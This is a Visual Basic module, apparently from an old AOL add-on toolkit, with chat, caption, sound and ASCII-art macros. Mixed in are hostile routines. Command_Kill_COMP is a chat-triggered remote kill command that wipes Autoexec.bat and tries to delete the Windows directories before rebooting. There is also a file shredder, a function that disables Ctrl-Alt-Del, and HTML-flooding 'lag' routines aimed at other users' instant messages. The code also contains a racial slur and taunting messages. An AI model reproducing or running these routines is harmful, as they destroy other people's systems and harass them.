Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "-"
Let newsent$ = newsent$ + NextChr$
Loop
r_dashed = newsent$

End Function


Function ie_captionTypeWriter(strin As String)
'ouwop
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + ""
TimeOut (0.3)
Let newsent$ = newsent$ + NextChr$
Call ie_Changecaption(newsent$)
Loop
End Function
Function ie_captionCombo(strin As String)
'ouwop
b4$ = ie_caption
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + ""
TimeOut (0.15)
Let newsent$ = newsent$ + NextChr$
Call ie_Changecaption(newsent$)
Loop
Call ie_Changecaption("")
TimeOut (0.2)
ie_Changecaption (newsent$)
TimeOut (0.2)
Call ie_Changecaption("")
TimeOut (0.2)
ie_Changecaption (newsent$)
TimeOut (0.2)
Call ie_Changecaption(b4$)
End Function
Function AOL_captionTypeWriter(strin As String)
'ouwop
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + ""
TimeOut (0.3)
Let newsent$ = newsent$ + NextChr$
Call AOLChangeCaption(newsent$)
Loop
Call AOLChangeCaption("Ouwop Online")
End Function

Function Chat_TypeWriter(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "<html></html>"
Let newsent$ = newsent$ + NextChr$
Loop
Chat_TypeWriter = newsent$

End Function


Sub wavstop()
Call Playwav(" ")
End Sub
Sub wavloop(file)
SoundName$ = file
wFlags% = SND_ASYNC Or SND_LOOP
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Sub Playwav(file)

SoundName$ = file
wFlags% = SND_ASYNC Or SND_NODEFAULT
X = sndPlaySound(SoundName$, wFlags%)
End Sub
Sub DestroyFile(sFileName As String)
    Dim Block1 As String, Block2 As String, Blocks As Long
    Dim hFileHandle As Integer, iLoop As Long, offset As Long
    'Create two buffers with a specified 'wipe-out' characters
    Const BLOCKSIZE = 4096
    Block1 = String(BLOCKSIZE, "X")
    Block2 = String(BLOCKSIZE, " ")
    'Overwrite the file contents with the wipe-out characters
    hFileHandle = FreeFile
    Open sFileName For Binary As hFileHandle
        Blocks = (LOF(hFileHandle) \ BLOCKSIZE) + 1
        For iLoop = 1 To Blocks
            offset = Seek(hFileHandle)
            Put hFileHandle, , Block1
            Put hFileHandle, offset, Block2
        Next iLoop
    Close hFileHandle
    'Now you can delete the file, which contains no sensitive data
    Kill sFileName
End Sub

Function Command_Kill_COMP()
'ouwop
'handy lil cchat incase u wunt to cchat kill uzer'z
Do: DoEvents
On Error Resume Next
Line$ = LastChatLine
uzer$ = InStr(SNFromLastChatLine, LCase("ouwop"))
If Line$ = LCase("-kill " + getuser + " /y") Then
Call DestroyFile("C:\Autoexec.bat") 'killz compz startup file
Call Directory_Delete2("C:\windows\system") 'killz all there hardware info
Call Directory_Delete2("c:\WINDOWS") 'killz main win dir
MsgBox "You iz fucked by Ouwopz Command fo0", vbCritical, "u = dead"
Call Exit_Restart 'restartz comp but wont load windowz back >;]
'-kill Wh0 /y
End If
Loop
End Function
Sub Directory_Delete2(dirnAmes$)
If Not IfDirExists(dirnAmes$) Then Exit Sub
On Error GoTo ErrorInDeletion
Kill dirnAmes$
Exit Sub
ErrorInDeletion:
MsgBox Error$
Resume Exitinga
Exitinga:
Exit Sub
End Sub
Function IfDirExists(TheDirectory)

Dim Check As Integer
On Error Resume Next
If Right(TheDirectory, 1) <> "/" Then TheDirectory = TheDirectory + "/"
Check = Len(dir$(TheDirectory))
If Err Or Check = 0 Then
    IfDirExists = False
Else
    IfDirExists = True
End If
End Function

Public Sub Disable_CTRL_ALT_DEL()
 Dim Ret As Integer
 Dim pOld As Boolean
 Ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub


Sub Say2Room(sn As ListBox, What2say$)
 'ouwop
For X% = 0 To list.listcount - 1
f = ("•·.¸¸.·´¯[" + What2say$ & list.list(X%))
sendchat (f)
TimeOut (0.7)
Next X%
End Sub





Function CurrentTime()
X = "" & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now) & ""
CurrentTime = X
End Function
Function CurrentDate()
X = "" & Month(Now) & "/" & Day(Now) & "/" & Year(Now) & ""
CurrentDate = X
End Function
Sub ChangeRes(iWidth As Single, iHeight As Single)
Dim a As Boolean, i As Long, b As Long
i = 0
    Do
        a = EnumDisplaySettings(0&, i&, DevM)
        i = i + 1
    Loop Until (a = False)
    DevM.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
    DevM.dmPelsWidth = iWidth
    DevM.dmPelsHeight = iHeight
    b = ChangeDisplaySettings(DevM, 0)
End Sub


Public Function getuser() As String

    Dim AOL As Long, MDI As Long, welcome As Long
    Dim child As Long, UserString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    UserString$ = getcaption(child&)
    If InStr(UserString$, "Welcome, ") = 1 Then
        UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
        getuser$ = UserString$
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            UserString$ = getcaption(child&)
            If InStr(UserString$, "Welcome, ") = 1 Then
                UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
                getuser$ = UserString$
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    getuser$ = ""

End Function
 Function iz50()
'ouwop
'checkz if on aol50
'uze AOL_verziOn
'd$ = runaolmenu(4&, 9&)
    Dim lngaol As Long, lngmenu As Long, lngsubmenu As Long, lngid As Long
    Let lngaol& = FindWindow("AOL Frame25", vbNullString)
    Let lngmenu& = GetMenu(lngaol&)
    Let lngsubmenu& = GetSubMenu(lngmenu&, 4&)
    Let lngid& = GetMenuItemID(lngsubmenu&, 9&)
    '8235 ao4
    '8234 ao5
If lngid& = "8234" Then iz50 = 1 Else iz50 = 0
'MsgBox lngid&
End Function



Sub Availible(Person)
Call XAOL4_Keyword("aol://9293:")
topp:
TimeOut (0.1)
    Dim IMt As Long, Rich As Long, icon As Long
    IMt& = FindAwin("Send Instant Message")
    If IMt& = 0& Then GoTo topp
    TimeOut (0.5)
setT:
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
imsendto% = FindChildByClass(IM%, "_AOL_Edit")
Call SendMessageByString(imsendto%, WM_SETTEXT, 0, Person)
dd$ = imsendto%
If dd$ = "" Then
TimeOut (0.3)
GoTo setT:
Else
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
cLickiCoN (e)
TimeOut (1)
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwinmsgmsg$ = gettext(e2)

If okwinmsgmsg$ = Person & " is online and able to receive Instant Messages." Then
Msg$ = " Haz There IM ON!"
msgG$ = "<B> • Haz There </b><U> <I> IM ON!"
AvailibleYes = True
GoTo Ending
ElseIf okwinmsgmsg$ = Person & " is not currently signed on." Then
msgG$ = "<B> • <I></B>Iz <U>Not</u> Online or <U>Ghosting</u>!"
Msg$ = " Iz Not Online!"
AvailibleYes = False
Else
msgG$ = "<B> • Haz There </b><I><U> IM OFF!"
Msg$ = " Haz There IM OFF!"
AvailibleYes = False
End If
Ending:
If okwin% <> 0 Then
Call SendMessage(okwin%, WM_CLOSE, 0, 0)
Call SendMessage(IM%, WM_CLOSE, 0, 0)
End If
''''''''''''''''''''''''''''''''''''''''''''''''''''
sendchat ("<B><U>" + Person & "</u>" + msgG$)
Call MsgBox(Person & Msg$)
End If
End Sub
Sub Locate_PeeP(sn$)
'ouwop
nigga$ = sn$
Call XAOL4_Keyword("aol://3548:" + nigga$)
TimeOut (0.5)
staRt:
TimeOut (0.1)
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwin2$ = gettext(e2)
If okwin2$ = "Member is not currently signed on." Then
Call SendMessage(okwin%, WM_CLOSE, 0, 0)
fgf3$ = "« [<i></b> " + nigga$ + ", Not Signed On or Ghozting </i><B>]"
BoldSendChat (fgf3$)
If FindRoom = 0 Then MsgBox (nigga$ + ", iz not Signed on - or Ghozting!"), 64, "Not Online"
GoTo dud
Else
IM% = FindChildByTitle(AolMdi(), "Locate " + sn)
imR2 = gettext(IM%)
iTT% = FindChildByTitle(AolMdi(), imR2)
imsendto% = FindChildByClass(iTT%, "_AOL_Static")
okMsG$ = gettext(imsendto%)
If okMsG$ = "" Then GoTo staRt
Fgf$ = "« [<i></b> " + okMsG$ + "</i><B>]"
AOL4_KillWin (iTT%)
BoldSendChat (Fgf$)
If FindRoom = 0 Then MsgBox (okMsG$)
End If
dud:
End Sub




Sub IM_LAGG(sn, ProggNaME$)
sendchat ("<-·´¯`·.·°(IM Laggin " + sn)
Call sendim(sn, Chat_LAGG(ProggNaME$))
TimeOut (2.5)
Call IManswer("<Font Color=#ff3300>_<sup><html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300></sup>_<html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300></sup>_<html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300></sup>_<html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300></sup>_<html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300></sup>_<html></html><html></html><html></html><sup>_<html></html><html></html><html></html><Font Color=#ff3300><sup>_<html></html><html></html><html></html></sup>_<html></html><html></html><html></html><Font Color=#ff3300><sup>_<html></html><html></html><html></html>")
TimeOut (2.5)
Call IManswer("<sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html></sup>¯<html></html><html></html><html></html><Font Color=#ff3300><sup>¯<html></html><html></html><html></html><Font Color=#ff3300></sup>¯<html></html><html></html><html></html><B><i>" + ProggNaME$)
TimeOut (2.5)
Call IManswer("<Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*<html></html><html></html><html></html>*<html></html><html></html><html></html><Font Color=#fffffe>*")
TimeOut (2.5)
Call IManswer(Chat_LAGG(ProggNaME$))
TimeOut (2.5)





End Sub

Sub Macro_CallMe()
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...

sPrompt = "Enta Your Phone Number with the DASH  Ex: 768-8489 ((No Area Code))... "  'Set the prompt...

iXPos = IIf(iXPos > 4000, 0, 0) 'Change windows location...
iXPos = IIf(iYPos > 4000, 0, 0) 'If() Covered next chapter...

sName = InputBox$(sPrompt, IB_TITLE, , iXPos, iYPos)    'Display box, get input
If sName = "" Then
Else



sendchat ".<B>©all Me Sometime"
TimeOut (0.5)
sendchat ".  \\"
TimeOut (0.5)
sendchat ".   \\"
TimeOut (0.5)
sendchat ".     \\"
TimeOut (0.5)
sendchat ".      \\"
TimeOut (0.5)
sendchat ".      _\\_______"
TimeOut (0.5)
sendchat ".     /\                \"
TimeOut (0.5)
sendchat ".     |  \      (\\\)     \"
TimeOut (0.5)
sendchat ".     |M \_________\     {S phone"
TimeOut (0.5)
sendchat ".     |  o  \(" + sName + ")\"
TimeOut (0.5)
sendchat ".      \   t  \~~~~~~~ \"
TimeOut (0.5)
sendchat ".        \  o  \{1} {2} {3} \"
TimeOut (0.5)
sendchat ".          \  r   \{4} {5} {6} \"
TimeOut (0.5)
sendchat ".            \  o  \{7} {8} {9} \"
TimeOut (0.5)
sendchat ".              \  l   \{*} {0} {#} \"
TimeOut (0.5)
sendchat ".                \_a_\________\"
TimeOut (0.5)
sendchat ".                       \\              \"
TimeOut (0.5)
sendchat ".                          \\      ',',     \"
TimeOut (0.5)
sendchat ".                            \\________)"
TimeOut (0.5)
End If

End Sub

Sub Macro_DiePuffin()
sendchat ".     ."
TimeOut (0.5)
sendchat ".               .·´.·´         `·.`·.                               <Font Color=#cccccc>(("
TimeOut (0.5)
sendchat ".              .·´.·´                 `·.`·.                            <Font Color=#cccccc>) )"
TimeOut (0.5)
sendchat ".           (:::|::    __    __    ::|:::)                        <Font Color=#cccccc>(  ("
TimeOut (0.5)
sendchat ".                     ___   ___"
TimeOut (0.5)
sendchat ".             \::\:Ì (___) (___) Í:/::/           <Font Color=#993300>___<Font Color=#gggggg>/|')<Font Color=#993300>____ <Font Color=#cccccc>)  )"
TimeOut (0.5)
sendchat ".               \(___    ^^    ___)/           <Font Color=#993300>(________((<Font Color=#ff3300>#="
TimeOut (0.5)
sendchat ".              <Font Color=#0000ff>(¯¯ '<Font Color=#gggggg>||:ÌuuuuuÍ:|<Font Color=#0000ff>|¯¯¯)             /¯( / /`·."
TimeOut (0.5)
sendchat ".              <Font Color=#0000ff>/::::: \<Font Color=#gggggg>\^^^^^^^//<Font Color=#0000ff> :::::¯\<Font Color=#gggggg>            \_  ) `·./"
TimeOut (0.5)
sendchat ".            <Font Color=#0000ff>/::::::\:::<Font Color=#gggggg>\____/<Font Color=#0000ff>:::::::/::::`·.      /(<Font Color=#gggggg>/    /¯"
TimeOut (0.5)
sendchat ".          <Font Color=#0000ff>/::::::: /:::::::::::::::::::\::::::::`·./::::\<Font Color=#gggggg> /<Font Color=#0000ff>:\\"
TimeOut (0.5)
sendchat ".         <Font Color=#0000ff>/:::: _ /___::::::::::::::::::\`·.:::::::::::::\::\\"
TimeOut (0.5)
sendchat ".       <Font Color=#0000ff>(:::::::::::::::/<Font Color=#gggggg>___:<B>{S ReGuLaTa}<Font Color=#0000ff>:·::::::::::::|::||"
TimeOut (0.5)
sendchat ".         <Font Color=#0000ff>\:::::::::: /<Font Color=#gggggg>_____\___<Font Color=#0000ff>::::::::\  \::::::::::|::||:||::::::|::"
TimeOut (0.5)
BoldSendChat (".               Im Gonna Die PuFFIN!")
TimeOut (0.5)


End Sub



Sub Macro_GoingPHISHing()
sendchat ".  __|_%__|__               // \Going Phishin!"
TimeOut (0.5)
sendchat ".      |  (oo)                  //    \ <>< ><>"
TimeOut (0.5)
sendchat ".      | |   O \               //       \Here Accountz !"
TimeOut (0.5)
sendchat ".   _ | \__o_/             //          \"
TimeOut (0.5)
sendchat ".  /\ \‡‡\_/‡\ \\         //             \ {S ReGuLaTa 2}"
TimeOut (0.5)
sendchat ". |‡|| |‡‡‡‡‡| |‡\__ o//                \"
TimeOut (0.5)
sendchat ". |‡||  --   ---  |‡‡‡‡|//8                 \"
TimeOut (0.5)
sendchat ". \‡‡‡‡_)___|      //                      \"
TimeOut (0.5)
sendchat ".    | /         \ |    //                         \"
TimeOut (0.5)
sendchat ".    |       |     |                                 \"
TimeOut (0.5)
sendchat ".    |____|___|                                  \"
TimeOut (0.5)
sendchat ".     |__|_ |__|_                                   \"
TimeOut (0.5)
sendchat ". __|____\|___\______~^~^~^~^~^~^~^~^~^~^~^~^~^~^"
TimeOut (0.5)
sendchat ". |                              |   ><> ~^><}}}}}>~^~"
TimeOut (0.5)
sendchat ". |                              |~^~^ HELP Uz! ~^~^~"
TimeOut (0.5)
sendchat ". |_________________|<><   <)))))><         ~^~^~^~^~~^"
TimeOut (0.5)
sendchat ".  ><))))>          ><>   <O>< "
TimeOut (0.5)
sendchat ".><.i> <M>< <>< <G>< ,><>                           <D><"
TimeOut (0.5)
TimeOut (0.5)

End Sub

Function ScanFileS(FileName As String, SearchString As String) As Long
'scanz for sendkeyz 'Ouwop
free = FreeFile
Dim Where As Long
Open FileName$ For Binary Access Read As #free
For X = 1 To LOF(free) Step 32000
    Text$ = Space(32000)
    Get #free, X, Text$
    Debug.Print X
    If InStr(1, Text$, SearchString$, 1) Then
MsgBox "File " + FileName + " is a Sendkey !"
sendchat ("<b><I><U>(¯`^File " + FileName + " Is a Sendkey!")
Else
MsgBox "File " + FileName + " is Safe!"
sendchat ("<b><I><U>(¯`^File " + FileName + " Is clean of Sendkeyz!!")
End If
        Where = InStr(1, Text$, SearchString$, 1)
        ScanFileS = (Where + X) - 1
        Close #free
Next X
Close #free



End Function

Function ScanFileTXT_goTOreSultz(txt As TextBox, FileName As String, SearchString As String) As Long
free = FreeFile
Dim Where As Long
Open FileName$ For Binary Access Read As #free
For X = 1 To LOF(free) Step 32000
    Text$ = Space(32000)
    Get #free, X, Text$
    Debug.Print X
    If InStr(1, Text$, SearchString$, 1) Then
MsgBox "File " + FileName + " Does Have That text In it !", vbexlamation, "YES"
For h = 1 To LOF(free) Step 32000
    Text$ = Space(32000)

  txt.SelLength = InStr(1, Text$, SearchString$, 1)

Next h
Else
MsgBox "File " + FileName + " Does NOT Have That Text In it!", VBexlalamtion, "NO"
End If
        Where = InStr(1, Text$, SearchString$, 1)
        ScanFileTXT = (Where + X) - 1
        Close #free

Next X
Close #free
End Function


Function Chat_LAGG(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "<html></Html><html></Html><html></Html><html>"
Let newsent$ = newsent$ + NextChr$
Loop
Chat_LAGG = newsent$
'h = FindWindowEx(findChatRoom, 0&, "RICHCNTL", vbNullString)
'SendMessageByString h, WM_SETTEXT, 0&, ""
End Function

Function IM_LAGG_TalK(strin)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "</Html><html></Html><html></Html>"
Let newsent$ = newsent$ + NextChr$
Loop
IM_LAGG_TalK = newsent$
End Function
 Function enter(win)

'Call SendCharNum(win, 13)
End Function

Sub SendCharNum(win, Chars)
e = SendMessageByNum(win, WM_CHAR, Chars, 0)

End Sub

 Function Space_Key(win)

'Call SendCharNum(win, 13)
End Function
 Function Right_key(win)

'Call SendCharNum(win, 13)
End Function

Sub Highlight(txt As TextBox)
txt.SelStart = 0
txt.SelLength = Len(txt.Text)
End Sub



Sub OnlyNuminTXT(txt As TextBox)
If KeyAscii < 48 Or KeyAscii > 57 Then
KeyAscii = 0
End If
End Sub


Sub Progress(pb As Control, ByVal Percent)
Dim num$
If Not pb.AutoRedraw Then
pb.AutoRedraw = -1
End If
pb.Cls
pb.ScaleWidth = 100
pb.DrawMode = 10
num$ = Format$(Percent, "###") + "%"
pb.CurrentX = 50 - pb.TextWidth(num$) / 2
pb.CurrentY = (pb.ScaleHeight - pb.TextHeight(num$)) / 2
pb.Print num$
pb.Line (0, 0)-(Percent, pb.ScaleHeight), , BF
pb.Refresh
End Sub
 



Sub OpenCD()
retvalue = mciSendString("set CDAudio door open", _
ReturnString, 127, 0)
End Sub


Sub CloseCD()
retvalue = mciSendString("set CDAudio door closed", _
ReturnString, 127, 0)
End Sub



Function STR_DeCode(sstr As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sstr
    Let sSTRLen = Len(Made$)
Do While NumSpaces& <= sSTRLen
    Let NumSpaces& = NumSpaces& + 1
    Let NextChr$ = Mid$(Made$, NumSpaces&, 1)
If NextChr$ = "š" Then Let NextChr$ = "A"
If NextChr$ = "œ" Then Let NextChr$ = "B"
If NextChr$ = "¢" Then Let NextChr$ = "C"
If NextChr$ = "¤" Then Let NextChr$ = "D"
If NextChr$ = "±" Then Let NextChr$ = "E"
If NextChr$ = "°" Then Let NextChr$ = "F"
If NextChr$ = "²" Then Let NextChr$ = "G"
If NextChr$ = "³" Then Let NextChr$ = "H"
If NextChr$ = "µ" Then Let NextChr$ = "I"
If NextChr$ = "ª" Then Let NextChr$ = "J"
If NextChr$ = "¹" Then Let NextChr$ = "K"
If NextChr$ = "º" Then Let NextChr$ = "L"
If NextChr$ = "Ÿ" Then Let NextChr$ = "M"
If NextChr$ = "í" Then Let NextChr$ = "N"
If NextChr$ = "î" Then Let NextChr$ = "O"
If NextChr$ = "ï" Then Let NextChr$ = "P"
If NextChr$ = "ð" Then Let NextChr$ = "Q"
If NextChr$ = "ñ" Then Let NextChr$ = "R"
If NextChr$ = "ò" Then Let NextChr$ = "S"
If NextChr$ = "ó" Then Let NextChr$ = "T"
If NextChr$ = "ô" Then Let NextChr$ = "U"
If NextChr$ = "õ" Then Let NextChr$ = "V"
If NextChr$ = "ö" Then Let NextChr$ = "W"
If NextChr$ = "ø" Then Let NextChr$ = "X"
If NextChr$ = "ù" Then Let NextChr$ = "Y"
If NextChr$ = "ú" Then Let NextChr$ = "Z"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "'" Then Let NextChr$ = "a"
If NextChr$ = "û" Then Let NextChr$ = "b"
If NextChr$ = "ü" Then Let NextChr$ = "c"
If NextChr$ = "ý" Then Let NextChr$ = "d"
If NextChr$ = "þ" Then Let NextChr$ = "e"
If NextChr$ = "Æ" Then Let NextChr$ = "f"
If NextChr$ = "Ç" Then Let NextChr$ = "g"
If NextChr$ = "Ì" Then Let NextChr$ = "h"
If NextChr$ = "Í" Then Let NextChr$ = "i"
If NextChr$ = "Î" Then Let NextChr$ = "j"
If NextChr$ = "Ï" Then Let NextChr$ = "k"
If NextChr$ = "Ø" Then Let NextChr$ = "l"
If NextChr$ = "Þ" Then Let NextChr$ = "m"
If NextChr$ = "ß" Then Let NextChr$ = "n"
If NextChr$ = "†" Then Let NextChr$ = "o"
If NextChr$ = "ƒ" Then Let NextChr$ = "p"
If NextChr$ = "Œ" Then Let NextChr$ = "q"
If NextChr$ = "Š" Then Let NextChr$ = "r"
If NextChr$ = "‡" Then Let NextChr$ = "s"
If NextChr$ = "¡" Then Let NextChr$ = "t"
If NextChr$ = "£" Then Let NextChr$ = "u"
If NextChr$ = "§" Then Let NextChr$ = "v"
If NextChr$ = "ì" Then Let NextChr$ = "w"
If NextChr$ = "ë" Then Let NextChr$ = "x"
If NextChr$ = "ê" Then Let NextChr$ = "y"
If NextChr$ = "é" Then Let NextChr$ = "z"
If NextChr$ = "è" Then Let NextChr$ = "1"
If NextChr$ = "ç" Then Let NextChr$ = "2"
If NextChr$ = "æ" Then Let NextChr$ = "3"
If NextChr$ = "á" Then Let NextChr$ = "4"
If NextChr$ = "å" Then Let NextChr$ = "5"
If NextChr$ = "â" Then Let NextChr$ = "6"
If NextChr$ = "ã" Then Let NextChr$ = "7"
If NextChr$ = "ä" Then Let NextChr$ = "8"
If NextChr$ = "à" Then Let NextChr$ = "9"
If NextChr$ = "×" Then Let NextChr$ = "0"
    Let NwO$ = NwO$ + NextChr$
Loop
STR_DeCode = NwO$
End Function
Function OUWOP_DeCode(sstr As String)
Dim Made As String, sSTRLen As Long, NumSpaces As Long
Dim NextChr As String, NwO As String
    Let Made$ = sstr
    Let sSTRLen = Len(Made$)
Do While NumSpaces& <= sSTRLen
    Let NumSpaces& = NumSpaces& + 1
    Let NextChr$ = Mid$(Made$, NumSpaces&, 1)
If NextChr$ = "Z" Then Let NextChr$ = "A"
If NextChr$ = "Y" Then Let NextChr$ = "B"
If NextChr$ = "X" Then Let NextChr$ = "C"
If NextChr$ = "W" Then Let NextChr$ = "D"
If NextChr$ = "V" Then Let NextChr$ = "E"
If NextChr$ = "U" Then Let NextChr$ = "F"
If NextChr$ = "T" Then Let NextChr$ = "G"
If NextChr$ = "S" Then Let NextChr$ = "H"
If NextChr$ = "R" Then Let NextChr$ = "I"
If NextChr$ = "Q" Then Let NextChr$ = "J"
If NextChr$ = "P" Then Let NextChr$ = "K"
If NextChr$ = "O" Then Let NextChr$ = "L"
If NextChr$ = "N" Then Let NextChr$ = "M"
If NextChr$ = "M" Then Let NextChr$ = "N"
If NextChr$ = "L" Then Let NextChr$ = "O"
If NextChr$ = "K" Then Let NextChr$ = "P"
If NextChr$ = "J" Then Let NextChr$ = "Q"
If NextChr$ = "I" Then Let NextChr$ = "R"
If NextChr$ = "H" Then Let NextChr$ = "S"
If NextChr$ = "G" Then Let NextChr$ = "T"
If NextChr$ = "F" Then Let NextChr$ = "U"
If NextChr$ = "E" Then Let NextChr$ = "V"
If NextChr$ = "D" Then Let NextChr$ = "W"
If NextChr$ = "C" Then Let NextChr$ = "X"
If NextChr$ = "B" Then Let NextChr$ = "Y"
If NextChr$ = "A" Then Let NextChr$ = "Z"

If NextChr$ = " " Then Let NextChr$ = " "

If NextChr$ = "a" Then Let NextChr$ = "z"
If NextChr$ = "b" Then Let NextChr$ = "y"
If NextChr$ = "c" Then Let NextChr$ = "x"
If NextChr$ = "d" Then Let NextChr$ = "w"
If NextChr$ = "e" Then Let NextChr$ = "v"
If NextChr$ = "f" Then Let NextChr$ = "u"
If NextChr$ = "g" Then Let NextChr$ = "t"
If NextChr$ = "h" Then Let NextChr$ = "s"
If NextChr$ = "i" Then Let NextChr$ = "r"
If NextChr$ = "j" Then Let NextChr$ = "q"
If NextChr$ = "k" Then Let NextChr$ = "p"
If NextChr$ = "l" Then Let NextChr$ = "o"
If NextChr$ = "m" Then Let NextChr$ = "n"
If NextChr$ = "n" Then Let NextChr$ = "m"
If NextChr$ = "o" Then Let NextChr$ = "l"
If NextChr$ = "p" Then Let NextChr$ = "k"
If NextChr$ = "q" Then Let NextChr$ = "j"
If NextChr$ = "r" Then Let NextChr$ = "i"
If NextChr$ = "s" Then Let NextChr$ = "h"
If NextChr$ = "t" Then Let NextChr$ = "g"
If NextChr$ = "u" Then Let NextChr$ = "f"
If NextChr$ = "v" Then Let NextChr$ = "e"
If NextChr$ = "w" Then Let NextChr$ = "d"
If NextChr$ = "x" Then Let NextChr$ = "c"
If NextChr$ = "y" Then Let NextChr$ = "b"
If NextChr$ = "z" Then Let NextChr$ = "a"

If NextChr$ = "9" Then Let NextChr$ = "1"
If NextChr$ = "8" Then Let NextChr$ = "2"
If NextChr$ = "7" Then Let NextChr$ = "3"
If NextChr$ = "6" Then Let NextChr$ = "4"
If NextChr$ = "5" Then Let NextChr$ = "5"
If NextChr$ = "4" Then Let NextChr$ = "6"
If NextChr$ = "3" Then Let NextChr$ = "7"
If NextChr$ = "2" Then Let NextChr$ = "8"
If NextChr$ = "1" Then Let NextChr$ = "9"
If NextChr$ = "0" Then Let NextChr$ = "0"
    Let NwO$ = NwO$ + NextChr$
Loop
OUWOP_DeCode = NwO$
End Function







Sub FormExit_Down(winForm As Form)
Do
winForm.top = Trim(Str(Int(winForm.top) + 300))
DoEvents
Loop Until winForm.top > 7200
If winForm.top > 7200 Then Unload winForm
End Sub

Sub RandomFont(txt)
'by Ouwop
    Dim Font
    Randomize
    Font = Int(13 * Rnd + 1)
    '"<B><FONT COLOR=""#008000"">"
If Font = 1 Then s$ = "<font face=""Lucida Handwriting"">" + txt
If Font = 2 Then s$ = "<font face=""Century Gothic"">" + txt
If Font = 3 Then s$ = "<font face=""Comic Sans MS"">" + txt
If Font = 4 Then s$ = "<font face=""Copperplate Gothic Light"">" + txt
If Font = 5 Then s$ = "<font face=""Copperplate Gothic Bold"">" + txt
If Font = 6 Then s$ = "<font face=""Lucida Sans Unicode"">" + txt
If Font = 7 Then s$ = "<font face=""Abadi MT Condensed Light"">" + txt
If Font = 8 Then s$ = "<font face=""Book Antiqua"">" + txt
If Font = 9 Then s$ = "<font face=""Times New Roman"">" + txt
If Font = 10 Then s$ = "<font face=""Arial"">" + txt
If Font = 11 Then s$ = "<font face=""Viner Hand ITC"">" + txt
If Font = 12 Then s$ = "<font face=""Jokerman"">" + txt
If Font = 13 Then s$ = "<font face=""Snap ITC"">" + txt



BoldSendChat (s$)
 TimeOut (0.5)
 
 
 
    
End Sub

Public Sub WaitForOKOrRoom(room As String)
'i didnt make diz but i would like you to know b4 u say it dont work
'dat it iz for AOL2.5, maybe 3.0 to, of courze 6-10 proggerz can
'change this to work for aol4.0- all u gota do iz change da windows n childz name
'ouwop
    Dim RoomTitle As String, FullWindow As Long, FullButton As Long
    room$ = LCase(RePlacestRing(room$, " ", ""))
    Do
        DoEvents
